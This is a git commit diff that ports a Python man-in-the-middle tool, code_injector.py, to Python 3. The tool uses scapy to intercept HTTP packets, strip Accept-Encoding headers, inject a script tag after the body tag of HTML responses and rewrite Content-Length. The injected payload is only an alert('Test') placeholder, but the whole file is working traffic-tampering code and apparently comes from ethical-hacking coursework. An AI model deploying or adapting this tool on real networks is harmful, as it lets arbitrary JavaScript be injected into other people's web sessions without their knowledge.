d3660ff3995af796260097a665169d5ff613fc56
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-04-28 13:18:35 +0530

    Compatible with python and python3

--- code_injector.py
+++ code_injector.py
@@ -14,24 +14,29 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
-        load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+]Request")
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+        try:
+            load = scapy_packet[scapy.Raw].load.decode()  # Converting it to string to make it work with python 3
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+]Request")
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+]Response")
-            injection_code = "<script>alert('Test')</script>"
-            load = load.replace("<body>", "<body>" + injection_code)  # replacing body tag with body and script tag to inject javascript code.
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)  # Using capturing and non capturing Regex and grouping them to only get the content length
-            if content_length_search and "text/html" in load:
-                content_length = content_length_search.group(1)
-                new_content_length = int(content_length) + len(injection_code)
-                load = load.replace(content_length, str(new_content_length))
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+]Response")
+                injection_code = "<script>alert('Test')</script>"
+                load = load.replace("<body>",
+                                    "<body>" + injection_code)  # replacing body tag with body and script tag to inject javascript code.
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)",
+                                                  load)  # Using capturing and non capturing Regex and grouping them to only get the content length
+                if content_length_search and "text/html" in load:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
 
-        if load != scapy_packet[scapy.Raw].load:
-            new_packet = set_load(scapy_packet, load)
-            packet.set_payload(str(new_packet))
+            if load != scapy_packet[scapy.Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(new_packet))
+        except UnicodeDecodeError:
+            pass
 
     packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
 
